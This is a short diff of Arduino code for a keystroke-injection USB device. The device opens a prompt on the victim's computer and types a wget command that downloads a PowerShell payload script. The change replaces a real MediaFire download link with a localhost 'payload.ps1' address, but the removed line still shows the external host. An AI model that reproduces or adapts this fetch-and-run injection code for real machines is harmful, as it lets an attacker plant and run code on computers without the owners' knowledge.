@@ -23,7 +23,7 @@ void setup(){
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(1000);
-  String text = "wget https://download1653.mediafire.com/j6k2npugru4g/27bg76hqihhierk/coucou.ps1 -O coucou.ps1";
+  String text = "wget https://localhost/payload.ps1 -O payload.ps1";
   String text_en = fr2en(text);
   Keyboard.print(text_en + "\n");
   delay(1000);
